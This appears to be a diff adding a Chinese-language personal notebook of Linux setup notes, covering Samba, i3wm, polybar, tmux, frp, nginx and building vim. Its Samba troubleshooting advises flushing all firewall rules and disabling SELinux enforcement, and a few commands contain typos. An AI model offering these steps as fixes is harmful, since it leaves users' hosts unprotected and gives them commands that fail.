+ok: run: postgres-exporter: (pid 70745) 0s
+ok: run: postgresql: (pid 70755) 0s
+ok: run: prometheus: (pid 70765) 1s
+ok: run: puma: (pid 70920) 0s
+ok: run: redis: (pid 70926) 1s
+ok: run: redis-exporter: (pid 70936) 0s
+ok: run: sidekiq: (pid 70951) 0s
+[root@dev129 zp]#
+</code></pre>
+<ul>
+<li>参考url:https://www.cnblogs.com/kevingrace/p/5985918.html</li>
+</ul>
+<h2 id="重置指定用户密码"><a class="header" href="#重置指定用户密码">重置指定用户密码</a></h2>
+<pre><code>https://baijiahao.baidu.com/s?id=1710986123716406076&amp;wfr=spider&amp;for=pc
+</code></pre>
+<h2 id="迁移项目到gitlab"><a class="header" href="#迁移项目到gitlab">迁移项目到gitlab</a></h2>
+<pre><code>git clone --mirror &lt;URL to my OLD repo location&gt;
+cd &lt;New directory where your OLD repo was cloned&gt;
+git remote set-url origin &lt;URL to my NEW repo location&gt;
+git push -f origin
+</code></pre>
+<h2 id="git-修改远程地址"><a class="header" href="#git-修改远程地址">git 修改远程地址</a></h2>
+<pre><code>git remote rm origin
+git remteo add origin git@192.168.2.129:myb/myb.git
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="mermaid"><a class="header" href="#mermaid">mermaid</a></h1>
+<h2 id="介绍"><a class="header" href="#介绍">介绍</a></h2>
+<ul>
+<li>官网：https://mermaidjs.github.io/</li>
+<li>Github 项目地址：https://github.com/knsv/mermaid</li>
+</ul>
+<h2 id="使用"><a class="header" href="#使用">使用</a></h2>
+<ul>
+<li>Mermaid 支持多种图表的方向，语法如下：</li>
+</ul>
+<pre><code>graph 方向描述
+    图表中的其他语句...
+</code></pre>
+<ul>
+<li>符号</li>
+</ul>
+<div class="table-wrapper"><table><thead><tr><th style="text-align: left">用词</th><th style="text-align: left">含义</th></tr></thead><tbody>
+<tr><td style="text-align: left">TB</td><td style="text-align: left">从上到下</td></tr>
+<tr><td style="text-align: left">BT</td><td style="text-align: left">从下到上</td></tr>
+<tr><td style="text-align: left">LR</td><td style="text-align: left">从左到右</td></tr>
+<tr><td style="text-align: left">RL</td><td style="text-align: left">从右到左</td></tr>
+</tbody></table>
+</div>
+<ul>
+<li>结点含义</li>
+</ul>
+<div class="table-wrapper"><table><thead><tr><th style="text-align: left">表述</th><th style="text-align: left">含义</th></tr></thead><tbody>
+<tr><td style="text-align: left">id[文字]</td><td style="text-align: left">矩形节点</td></tr>
+<tr><td style="text-align: left">id(文字)</td><td style="text-align: left">圆角矩形节点</td></tr>
+<tr><td style="text-align: left">id((文字))</td><td style="text-align: left">圆形节点</td></tr>
+<tr><td style="text-align: left">id&gt;文字]</td><td style="text-align: left">右向旗帜状节点</td></tr>
+<tr><td style="text-align: left">id{文字}</td><td style="text-align: left">菱形节点</td></tr>
+</tbody></table>
+</div>
+<ul>
+<li>节点间的连线</li>
+</ul>
+<div class="table-wrapper"><table><thead><tr><th style="text-align: left">表述</th><th style="text-align: left">说明</th></tr></thead><tbody>
+</tbody></table>
+</div>
+<blockquote>
+<pre><code>   | 添加尾部箭头
+</code></pre>
+</blockquote>
+<ul>
+<li>
+<pre><code>   | 不添加尾部箭头
+</code></pre>
+</li>
+</ul>
+<p>--       | 单线
+--text-- | 单线上加文字
+==       | 粗线
+==text== | 粗线加文字
+-.-      | 虚线
+-.text.- | 虚线加文字</p>
+<ul>
+<li>eg</li>
+</ul>
+<pre><code>web修改数据库表配置---&gt;通知share进程---&gt;通知cn进程---&gt;通知lobby进程---&gt;luckydraw_agent服务reload相关表---&gt;通知agent---&gt;通知客户端
+</code></pre>
+<pre><code class="language-mermaid">graph TB
+    id1(web管理后台)--修改抽奖配置表--&gt;id2[share进程收到通知]
+</code></pre>
+<pre><code class="language-mermaid">sequenceDiagram
+　　　participant Alice
+　　　participant Bob
+　　　Alice-&gt;Bob:Hello Bob, how are you?
+</code></pre>
+<pre><code class="language-mermaid">graph TB start--&gt;stop
+</code></pre>
+<pre><code class="language-mermaid">graph LR;
+    start--&gt;stop;
+    start--&gt;A;
+    start--&gt;B;
+</code></pre>
+<h2 id="帮助"><a class="header" href="#帮助">帮助</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/fenghuizhidao/article/details/79440583">mermaid实用教程</a></li>
+<li><a href="https://season.blog.csdn.net/article/details/52887045">mermaid简介</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="smb"><a class="header" href="#smb">smb</a></h1>
+<h2 id="重启"><a class="header" href="#重启">重启</a></h2>
+<pre><code>service smb restart
+</code></pre>
+<h2 id="设置selinux-成为permissive模式"><a class="header" href="#设置selinux-成为permissive模式">设置SELinux 成为permissive模式</a></h2>
+<pre><code>setenforce 0
+</code></pre>
+<h2 id="登录权限用的是samba用胡的权限"><a class="header" href="#登录权限用的是samba用胡的权限">登录权限用的是samba用胡的权限</a></h2>
+<h2 id="samba用户必须为linux用户"><a class="header" href="#samba用户必须为linux用户">samba用户必须为linux用户</a></h2>
+<h2 id="重启后无法访问smb"><a class="header" href="#重启后无法访问smb">重启后无法访问smb</a></h2>
+<ul>
+<li>可能是防火墙原因，关闭防火墙</li>
+</ul>
+<pre><code>iptables -F
+</code></pre>
+<ul>
+<li>设置SELinux 成为permissive模式</li>
+</ul>
+<pre><code>setenforce 0
+</code></pre>
+<h2 id="help"><a class="header" href="#help">help:</a></h2>
+<ul>
+<li><a href="http://blog.chinaunix.net/uid-26734201-id-3498034.html">SMB 重启 后访问失败</a></li>
+<li><a href="https://blog.csdn.net/spy_h/article/details/80921711">Linux samba配置共享目录</a></li>
+<li><a href="https://www.cnblogs.com/fklin/articles/2772364.html">WINDOWS访问SAMBA提示没有权限</a></li>
+<li><a href="https://www.cnblogs.com/xuelisheng/p/10449291.html">centos安装配置samba</a></li>
+<li><a href="https://blog.csdn.net/weixin_30558305/article/details/97772795?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">CentOS 7设置Samba共享目录</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="i3wm-key"><a class="header" href="#i3wm-key">i3wm key</a></h1>
+<ul>
+<li>多屏显示</li>
+</ul>
+<pre><code>xrandr --output HDMI2  --auto --right-of HDMI-3
+</code></pre>
+<ul>
+<li>mod</li>
+</ul>
+<pre><code>ctrl: $mod
+</code></pre>
+<ul>
+<li>config</li>
+</ul>
+<pre><code>alt:Mod1
+ctrl:Mod4
+</code></pre>
+<ul>
+<li>打开一个虚拟终端</li>
+</ul>
+<pre><code>mod+enter
+</code></pre>
+<ul>
+<li>拆分</li>
+</ul>
+<pre><code>mod+enter
+mod+v ++ mod+enter;水平分割
+mod+n ++ mod+enter;竖指分割
+</code></pre>
+<ul>
+<li>聚焦到父窗口</li>
+</ul>
+<pre><code>mod+a
+</code></pre>
+<ul>
+<li>进入工作区</li>
+</ul>
+<pre><code>mod+1,2,3...
+</code></pre>
+<ul>
+<li>移动窗口到其他工作区</li>
+</ul>
+<pre><code>mod+shift+1,2,3
+</code></pre>
+<ul>
+<li>全屏模式：</li>
+</ul>
+<pre><code>mod+f
+</code></pre>
+<ul>
+<li>三种模式：</li>
+</ul>
+<pre><code>splith/splitv: mod + e   mod+hjkl
+stacking:      mod + s   mod+jk
+tabbed:        mod + w   mod+hl
+</code></pre>
+<ul>
+<li>杀掉应用</li>
+</ul>
+<pre><code>mod+shift+q
+</code></pre>
+<ul>
+<li>重启i3</li>
+</ul>
+<pre><code>mod+shift+r
+</code></pre>
+<ul>
+<li>退出i3</li>
+</ul>
+<pre><code>mod+shift+e
+</code></pre>
+<ul>
+<li>浮动i3</li>
+</ul>
+<pre><code>mod+shift+space
+</code></pre>
+<ul>
+<li>打开应用</li>
+</ul>
+<pre><code>mod+d
+</code></pre>
+<ul>
+<li>小技巧:i3光标在virtualbox中，如何切换工作区？</li>
+</ul>
+<ol>
+<li>方法是按右边Ctrl键盘，xfreerdp被聚焦时同样适用。</li>
+</ol>
+<ul>
+<li>截图工具flameshot</li>
+</ul>
+<ol>
+<li>安装 sudo apt-get install flameshot</li>
+<li>设置快捷键 bindsym Print --release exec /usr/bin/flameshot gui</li>
+<li>浮动for_window [class=&quot;flameshot&quot;] floating enable</li>
+<li>保存剪贴板快捷键Ctrl-c</li>
+<li>使用按PrintScreen键</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h2 id="i3lock"><a class="header" href="#i3lock">i3lock</a></h2>
+<h3 id="介绍-1"><a class="header" href="#介绍-1">介绍</a></h3>
+<ol>
+<li>可用于锁屏</li>
+<li>默认白色</li>
+<li>下载i3lock-color可以进行锁品美化，显示时间</li>
+</ol>
+<h3 id="i3lock-color"><a class="header" href="#i3lock-color">i3lock-color</a></h3>
+<ol>
+<li>安装: sudo pacman -S i3lock-color</li>
+<li>脚本:</li>
+</ol>
+<ul>
+<li>https://github.com/Raymo111/i3lock-color</li>
+<li>./lock.sh</li>
+<li>./lock_bar.sh</li>
+</ul>
+<ol start="3">
+<li>github:</li>
+</ol>
+<ul>
+<li>https://github.com/Raymo111/i3lock-color</li>
+</ul>
+<ol start="4">
+<li>i3/config 配置:</li>
+</ol>
+<ul>
+<li>bindsym $mod+Mod1+l exec ~/.config/i3/lock.sh</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="配置i3status"><a class="header" href="#配置i3status">配置i3status</a></h2>
+<h3 id="相关配置"><a class="header" href="#相关配置">相关配置</a></h3>
+<ol>
+<li>配置文件路经: cp /etc/i3status.conf ~/.i3status.conf</li>
+<li>配置颜色</li>
+<li>设置cpu使用率</li>
+<li>关闭IPv6显示</li>
+<li>字段tztime local，format = “%Y-%m-%d %H:%M:%S %A”
+最后添加一个%A 就可以显示星期几了。</li>
+</ol>
+<h3 id="参考帮助"><a class="header" href="#参考帮助">参考帮助</a></h3>
+<ol>
+<li>github:https://github.com/i3/i3status</li>
+<li>https://www.icode9.com/content-4-512576.html</li>
+<li>Arch linux i3bar之i3status配置 https://www.waimaosns.cc/arch-linux-i3bar-i3status-config/</li>
+<li>linux man page:https://linux.die.net/man/1/i3status</li>
+</ol>
+<h3 id="demo-1"><a class="header" href="#demo-1">demo</a></h3>
+<ol>
+<li>https://gitee.com/siyingcheng/my_manjaro_i3wm_config/blob/master/config/i3status/config</li>
+<li>./.i3status.conf</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="install-1"><a class="header" href="#install-1">install</a></h2>
+<ul>
+<li>sudo pacman -S screenkey</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="player"><a class="header" href="#player">player</a></h2>
+<ul>
+<li>推荐使用vlc,cvlc</li>
+</ul>
+<h2 id="声音管理器"><a class="header" href="#声音管理器">声音管理器</a></h2>
+<ul>
+<li>pavucontrol</li>
+<li>install: sudo pacman -S pavucontrol</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="polybar"><a class="header" href="#polybar">polybar</a></h1>
+<h2 id="install-2"><a class="header" href="#install-2">install</a></h2>
+<pre><code>yaourt -S polybar
+install -Dm644 /usr/share/doc/polybar/config $HOME/.config/polybar/config
+</code></pre>
+<h2 id="配置-1"><a class="header" href="#配置-1">配置</a></h2>
+<ul>
+<li>弄一份 example 的配置文件过来 编辑启动文件 vim ~/.config/polybar/launch.sh 如下：</li>
+</ul>
+<pre><code>#!/usr/bin/env bash
+
+# Terminate already running bar instances
+killall -q polybar
+
+# Wait until the processes have been shut down
+while pgrep -u $UID -x polybar &gt;/dev/null; do sleep 1; done
+
+# Launch bar1 and bar2
+# polybar bar1 &amp;
+# polybar bar2 &amp;
+polybar example &amp;
+
+echo &quot;Bars launched...&quot;
+</code></pre>
+<p>#!/usr/bin/env bash</p>
+<h1 id="terminate-already-running-bar-instances"><a class="header" href="#terminate-already-running-bar-instances">Terminate already running bar instances</a></h1>
+<p>killall -q polybar</p>
+<h1 id="wait-until-the-processes-have-been-shut-down"><a class="header" href="#wait-until-the-processes-have-been-shut-down">Wait until the processes have been shut down</a></h1>
+<p>while pgrep -u $UID -x polybar &gt;/dev/null; do sleep 1; done</p>
+<h1 id="launch-bar1-and-bar2"><a class="header" href="#launch-bar1-and-bar2">Launch bar1 and bar2</a></h1>
+<h1 id="polybar-bar1"><a class="header" href="#polybar-bar1">polybar bar1 &amp;</a></h1>
+<h1 id="polybar-bar2"><a class="header" href="#polybar-bar2">polybar bar2 &amp;</a></h1>
+<p>polybar example &amp;</p>
+<p>echo &quot;Bars launched...&quot;
+vim ~/.i3/config
+搜索 start_conky,注释掉
+添加 exec_always --no-startup-id ~/.config/polybar/launch.sh
+替换原来系统的 conky
+注释掉 i3bar_command i3bar，添加 i3bar_command $HOME/.config/polybar/launch.sh。
+$mod + shift + r 重新加载 i3</p>
+<h2 id="other-tools"><a class="header" href="#other-tools">other tools</a></h2>
+<p>yaourt -S ttf-unifont or yay -S ttf-unifont
+yaourt -S siji-git</p>
+<h2 id="polybar-不留边"><a class="header" href="#polybar-不留边">polybar 不留边</a></h2>
+<p>我们可以修改config文件进行属性的设定。example的状态栏会有留边，我们可以修改border-size属性来取消。</p>
+<p>border-size = 0
+border-color = #00000000</p>
+<h2 id="polybar无法透明化"><a class="header" href="#polybar无法透明化">polybar无法透明化</a></h2>
+<ul>
+<li>
+<p>如果你使用compton进行透明化，polybar可能会出现无法透明的情况。</p>
+<ol>
+<li>可能与你的compton配置有关。</li>
+<li>可能是你的polybar问题。</li>
+</ol>
+</li>
+<li>
+<p>将[color]下的background修改为 background = #cc222222 ，从而实现透明化。</p>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="rofi"><a class="header" href="#rofi">rofi</a></h2>
+<ul>
+<li>安装</li>
+</ul>
+<pre><code>yaourt -S rofi
+</code></pre>
+<ul>
+<li>编辑 vim .i3/config,注释掉有 $mod+d 的那一行，添加:</li>
+</ul>
+<pre><code>bindsym $mod+d exec rofi -show run
+</code></pre>
+<ul>
+<li>重新加载配置</li>
+</ul>
+<pre><code>$mod+shift+r
+</code></pre>
+<ul>
+<li>
+<p>$mod+d 运行</p>
+</li>
+<li>
+<p>切换到 cd ~/.config/rofi/</p>
+</li>
+<li>
+<p>生成配置文件</p>
+</li>
+</ul>
+<pre><code>rofi -dump-Xresources &gt; config
+</code></pre>
+<ul>
+<li>选择你想要的主题即可</li>
+</ul>
+<pre><code>rofi-theme-selector
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="dotfiles配置"><a class="header" href="#dotfiles配置">dotfiles配置</a></h2>
+<h3 id="使用makefile管理dotfiles"><a class="header" href="#使用makefile管理dotfiles">使用makefile管理dotfiles</a></h3>
+<h3 id="demo-2"><a class="header" href="#demo-2">demo</a></h3>
+<ol>
+<li>https://github.com/voldikss/dotfiles/blob/master/Makefile</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="ftp工具"><a class="header" href="#ftp工具">ftp工具</a></h2>
+<h3 id="ftp"><a class="header" href="#ftp">ftp</a></h3>
+<ol>
+<li>安装ftp: yum install ftp</li>
+<li>进入ftp: ftp 192.168.2.118</li>
+<li>获取文件a.txt: get a.txt</li>
+<li>上传文件a.txt: put a.txt</li>
+</ol>
+<h3 id="lftp"><a class="header" href="#lftp">lftp</a></h3>
+<ol>
+<li>yum install lftp</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="tmux"><a class="header" href="#tmux">tmux</a></h1>
+<h2 id="install-3"><a class="header" href="#install-3">install</a></h2>
+<pre><code>yum install -y tmux
+</code></pre>
+<h2 id="退出tmux"><a class="header" href="#退出tmux">退出tmux</a></h2>
+<pre><code>C-b d 退出tumx，并保存当前会话
+或
+tmux detach
+</code></pre>
+<h2 id="重命名窗口"><a class="header" href="#重命名窗口">重命名窗口</a></h2>
+<pre><code>C-b + :
+rename-window myb_dev
+或
+C-b + ,
+</code></pre>
+<h2 id="关闭当前pannel"><a class="header" href="#关闭当前pannel">关闭当前pannel</a></h2>
+<pre><code>C-b + :
+kill-pane
+</code></pre>
+<h2 id="重命名会话session"><a class="header" href="#重命名会话session">重命名会话(Session)</a></h2>
+<pre><code>C-b + :
+rename-session myb_dev
+或
+C-b + $
+</code></pre>
+<h2 id="防止退出时重命名窗口被重置"><a class="header" href="#防止退出时重命名窗口被重置">防止退出时重命名窗口被重置</a></h2>
+<pre><code>修改.tmux.conf
+set-option allow-rename off
+</code></pre>
+<h2 id="跳转pannel大小"><a class="header" href="#跳转pannel大小">跳转pannel大小</a></h2>
+<pre><code>Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。
+</code></pre>
+<h2 id="使用-1"><a class="header" href="#使用-1">使用</a></h2>
+<ul>
+<li>
+<p>打开：tmux</p>
+</li>
+<li>
+<p>操作前缀:Ctrl + b</p>
+</li>
+<li>
+<p>分割：%;b</p>
+</li>
+<li>
+<p>关闭分割：x</p>
+</li>
+<li>
+<p>C-b ? 显示快捷键帮助</p>
+</li>
+<li>
+<p>C-b C-o 调换窗口位置，类似与vim 里的C-w</p>
+</li>
+<li>
+<p>C-b 空格键 采用下一个内置布局</p>
+</li>
+<li>
+<p>C-b ! 把当前窗口变为新窗口</p>
+</li>
+<li>
+<p>C-b &quot; 模向分隔窗口</p>
+</li>
+<li>
+<p>C-b % 纵向分隔窗口</p>
+</li>
+<li>
+<p>C-b q 显示分隔窗口的编号</p>
+</li>
+<li>
+<p>C-b o 跳到下一个分隔窗口</p>
+</li>
+<li>
+<p>C-b 上下键 上一个及下一个分隔窗口</p>
+</li>
+<li>
+<p>C-b ALT-方向键 调整分隔窗口大小</p>
+</li>
+<li>
+<p>C-b c 创建新窗口</p>
+</li>
+<li>
+<p>C-b 0~9 选择几号窗口</p>
+</li>
+<li>
+<p>C-b c 创建新窗口</p>
+</li>
+<li>
+<p>C-b n 选择下一个窗口</p>
+</li>
+<li>
+<p>C-b l 切换到最后使用的窗口</p>
+</li>
+<li>
+<p>C-b p 选择前一个窗口</p>
+</li>
+<li>
+<p>C-b w 以菜单方式显示及选择窗口</p>
+</li>
+<li>
+<p>C-b t 显示时钟</p>
+</li>
+<li>
+<p>C-b ; 切换到最后一个使用的面板</p>
+</li>
+<li>
+<p>C-b x 关闭面板</p>
+</li>
+<li>
+<p>C-b &amp; 关闭窗口</p>
+</li>
+<li>
+<p>C-b s 以菜单方式显示和选择会话</p>
+</li>
+<li>
+<p>C-b d 退出tumx，并保存当前会话，这时，tmux仍在后台运行，可以通过tmux attach进入 到指定的会话</p>
+</li>
+</ul>
+<h2 id="其它命令"><a class="header" href="#其它命令">其它命令</a></h2>
+<pre><code># 列出所有快捷键，及其对应的 Tmux 命令
+$ tmux list-keys
+
+# 列出所有 Tmux 命令及其参数
+$ tmux list-commands
+
+# 列出当前所有 Tmux 会话的信息
+$ tmux info
+
+# 重新加载当前的 Tmux 配置
+$ tmux source-file ~/.tmux.conf
+</code></pre>
+<h2 id="帮助-1"><a class="header" href="#帮助-1">帮助</a></h2>
+<ul>
+<li><a href="https://www.cnblogs.com/chjbbs/p/5689011.html">tmux的使用方法和个性化配置</a></li>
+<li><a href="http://blog.aka-cool.net/blog/2014/05/09/tmux-rename-window/">tmux 窗口重命名</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="frp"><a class="header" href="#frp">frp</a></h2>
+<h3 id="内网穿透工具"><a class="header" href="#内网穿透工具">内网穿透工具</a></h3>
+<ol>
+<li>
+<p>github:
+https://github.com/fatedier/frp.git
+https://github.com/fatedier/frp/releases/</p>
+</li>
+<li>
+<p>help:
+https://sunnyrx.com/2016/10/21/simple-to-use-frp/</p>
+</li>
+<li>
+<p>install</p>
+</li>
+</ol>
+<pre><code>wget https://github.com/fatedier/frp/releases/download/v0.24.1/frp_0.24.1_linux_amd64.tar.gz
+tar -zxvf frp_0.24.1_linux_amd64.tar.gz
+cd frp_0.24.1_linux_amd64
+rm -f frps
+rm -f frps.ini
+vi frpc.ini
+</code></pre>
+<ol start="4">
+<li>config</li>
+</ol>
+<ul>
+<li>客户端配置服务器端端口和ssh端口</li>
+</ul>
+<ol start="5">
+<li>start</li>
+</ol>
+<ul>
+<li>
+<p>server
+./frps -c ./frps.ini</p>
+</li>
+<li>
+<p>client
+./frpc -c ./frpc.ini</p>
+</li>
+</ul>
+<ol start="6">
+<li>后台运行</li>
+</ol>
+<ul>
+<li>server</li>
+</ul>
+<pre><code>nohup ./frps -c ./frps.ini &amp;
+
+</code></pre>
+<ul>
+<li>client</li>
+</ul>
+<pre><code>nohup ./frpc -c ./frpc.ini &amp;
+</code></pre>
+<ol start="7">
+<li>安全暴露内网服务</li>
+</ol>
+<pre><code>https://gofrp.org/docs/examples/stcp/
+</code></pre>
+<ol start="8">
+<li>配置开机启动</li>
+</ol>
+<pre><code>#systemd配置文件路径:
+ /usr/lib/systemd/system/
+</code></pre>
+<ul>
+<li>添加frpc.service</li>
+<li>添加frps.service</li>
+<li>客户端日志目录:/var/log/frp/frpc.log</li>
+<li>服务器日志目录:/var/log/frp/frps.log</li>
+<li>日志文件若权限不够,修改frpc.service中的user为root或单独添加一个用户赋予权限</li>
+</ul>
+<pre><code>https://blog.csdn.net/qq_42952331/article/details/104810383
+https://www.cnblogs.com/srczhang/p/12698685.html
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="flameshot"><a class="header" href="#flameshot">flameshot</a></h1>
+<h2 id="简介"><a class="header" href="#简介">简介</a></h2>
+<p>flameshot 是一款跨平台的截图工具。</p>
+<h2 id="配置文件路经"><a class="header" href="#配置文件路经">配置文件路经</a></h2>
+<pre><code>linux:
+~/.config/flameshot/flameshot.ini
+windows:
+C:\Users\{YOURNAME}\AppData\Roaming\flameshot\flameshot.ini
+</code></pre>
+<h2 id="github地址"><a class="header" href="#github地址">github地址:</a></h2>
+<pre><code>https://github.com/flameshot-org/flameshot
+</code></pre>
+<h2 id="下载"><a class="header" href="#下载">下载</a></h2>
+<pre><code>https://github.com/flameshot-org/flameshot/releases/tag/v0.10.2
+</code></pre>
+<h2 id="常见平台安装"><a class="header" href="#常见平台安装">常见平台安装</a></h2>
+<ul>
+<li>MacOS</li>
+</ul>
+<pre><code>brew install --cask flameshot
+</code></pre>
+<ul>
+<li>Manjaro</li>
+</ul>
+<pre><code>pacman -S flameshot
+</code></pre>
+<ul>
+<li>Ubuntu 18.04+</li>
+</ul>
+<pre><code>apt install flameshot
+</code></pre>
+<ul>
+<li>Debian 10+</li>
+</ul>
+<pre><code>apt install flameshot
+</code></pre>
+<ul>
+<li>windows 直接下载安装包,下载地址:</li>
+</ul>
+<pre><code>https://github.com/flameshot-org/flameshot/releases/tag/v0.10.2
+</code></pre>
+<h2 id="常用快捷键"><a class="header" href="#常用快捷键">常用快捷键</a></h2>
+<pre><code>按PrintScreen键 激活
+Ctrl + c 拷贝到剪贴版
+Ctrl + s 保存到文件
+Ctrl + z 撤销
+</code></pre>
+<h2 id="常见问题-1"><a class="header" href="#常见问题-1">常见问题</a></h2>
+<ul>
+<li>运行时提示 linux下提示/usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.14' not found 解决办法</li>
+</ul>
+<pre><code>sudo pacman -Ss gcc
+sudo pacman -S core/gcc
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="nginx笔记"><a class="header" href="#nginx笔记">nginx笔记</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="nginx配置笔记"><a class="header" href="#nginx配置笔记">nginx配置笔记</a></h1>
+<h2 id="基本概念-1"><a class="header" href="#基本概念-1">基本概念</a></h2>
+<ul>
+<li>惊群现象：一个网路连接到来，多个睡眠的进程被同时叫醒，但只有一个进程能获得链接，这样会影响系统性能。</li>
+</ul>
+<h2 id="全局块"><a class="header" href="#全局块">全局块</a></h2>
+<ul>
+<li>nginx服务器用户组</li>
+<li>nginx进程pid</li>
+<li>日志存放路径</li>
+<li>配置文件引入</li>
+<li>允许生成worker process数</li>
+</ul>
+<h2 id="event块"><a class="header" href="#event块">event块</a></h2>
+<ul>
+<li>配置影响nginx服务器或与用户的网络连接。包括:</li>
+<li>每个进程的最大连接数</li>
+<li>选取那种事件驱动模型处理连接请求</li>
+<li>是否允许同时接受多个网路连接</li>
+<li>开启多个网络连接序列化等。</li>
+</ul>
+<h2 id="http块"><a class="header" href="#http块">http块</a></h2>
+<ul>
+<li>可以嵌套多个server</li>
+<li>配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。</li>
+<li>文件引入</li>
+<li>mime-type定义</li>
+<li>日志定义</li>
+<li>是否使用sendfile传输文件</li>
+<li>连接超时时间</li>
+<li>单连接请求数</li>
+</ul>
+<h2 id="server块"><a class="header" href="#server块">server块</a></h2>
+<ul>
+<li>配置虚拟主机的相关参数，一个http中可以有多个server块</li>
+</ul>
+<h2 id="location-块"><a class="header" href="#location-块">location 块</a></h2>
+<ul>
+<li>配置请求的路由，以及各种页面的请求情况</li>
+</ul>
+<h2 id="nginx文件结构"><a class="header" href="#nginx文件结构">nginx文件结构</a></h2>
+<pre><code>...              #全局块
+
+events {         #events块
+    ...
+}
+
+http      #http块
+{
+    ...   #http全局块
+        server        #server块
+        { 
+            ...       #server全局块
+                location [PATTERN]   #location块
+                {
+                    ...
+                }
+            location [PATTERN] 
+            {
+                ...
+            }
+        }
+    server
+    {
+        ...
+    }
+    ...     #http全局块
+}
+</code></pre>
+<h2 id="一个nginx-配置文件的拆解分析"><a class="header" href="#一个nginx-配置文件的拆解分析">一个nginx 配置文件的拆解分析</a></h2>
+<pre><code>########### 每个指令必须有分号结束。#################
+#user administrator administrators;  #配置用户或者组，默认为nobody nobody。
+#worker_processes 2;  #允许生成的进程数，默认为1
+#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址
+error_log log/error.log debug;  #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg
+events {
+        accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on
+        multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off
+        #use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport
+        worker_connections  1024;    #最大连接数，默认为512
+}
+http {
+        include       mime.types;   #文件扩展名与文件类型映射表
+        default_type  application/octet-stream; #默认文件类型，默认为text/plain
+        #access_log off; #取消服务日志
+        log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式
+        access_log log/access.log myFormat;  #combined为日志格式的默认值
+        sendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。
+        sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。
+        keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。
+
+        upstream mysvr {
+            server 127.0.0.1:7878;
+            server 192.168.10.121:3333 backup;  #热备
+        }
+
+        error_page 404 https://www.baidu.com; #错误页
+        server {
+                keepalive_requests 120; #单连接请求上限次数。
+                listen       4545;   #监听端口
+                server_name  127.0.0.1;   #监听地址
+                location  ~*^.+$ {       #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。
+                #root path;  #根目录
+                #index vv.txt;  #设置默认页
+                proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表
+                deny 127.0.0.1;  #拒绝的ip
+                allow 172.18.5.54; #允许的ip
+        }
+    }
+}
+</code></pre>
+<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
+<ul>
+<li>https://www.runoob.com/w3cnote/nginx-setup-intro.html</li>
+<li>https://www.jianshu.com/p/96d3b1fba09b</li>
+<li>https://www.jianshu.com/p/96d3b1fba09b</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vim"><a class="header" href="#vim">vim</a></h1>
+<h2 id="安装"><a class="header" href="#安装">安装</a></h2>
+<pre><code>$ cd /usr/local/src/
+$ wget https://codeload.github.com/vim/vim/tar.gz/v8.0.0134
+</code></pre>
+<h2 id="解压-1"><a class="header" href="#解压-1">解压</a></h2>
+<pre><code>$ tar zxf v8.0.0134
+</code></pre>
+<h2 id="编译"><a class="header" href="#编译">编译</a></h2>
+<pre><code>$ cd vim-8.0.0134/
+$ ./configure --with-features=huge \
+              --enable-multibyte \
+              --enable-rubyinterp=yes \
+              --enable-pythoninterp=yes \
+              --with-python-config-dir=/usr/lib64/python2.7/config \
+              --enable-python3interp=yes \
+              --with-python3-config-dir=/usr/local/python3/lib/python3.6/config-3.6m-x86_64-linux-gnu \
+              --enable-perlinterp=yes \
+              --enable-luainterp=yes \
+              --enable-gui=gtk2 --enable-cscope --prefix=/usr
+</code></pre>
+<pre><code> ./configure --with-features=huge --with-luajit --enable-luainterp=yes--enable-fail-if-missing --with-lua-prefix=/usr/local --prefix=/usr/local/vim/vim8 --enable-multibyte --enable-rubyinterp=yes --enable-pythoninterp=yes --with-python-config-dir=/usr/lib64/python2.7/config --enable-python3interp=yes --with-python3-config-dir=/usr/local/python3/lib/python3.6/config-3.6m-x86_64-linux-gnu --enable-perlinterp=yes  --enable-luainterp=yes --enable-gui=gtk2 --enable-cscope
+</code></pre>
+<pre><code>/bin/perl -e 'unless ( $] &gt;= 5.005 ) { for (qw(na defgv errgv)) { print &quot;#define PL_$_ $_\n&quot; }}' &gt; auto/if_perl.c
+/bin/perl /usr/bin/xsubpp -prototypes -typemap /usr/share/perl5/ExtUtils/typemap if_perl.xs &gt;&gt; auto/if_perl.c
+
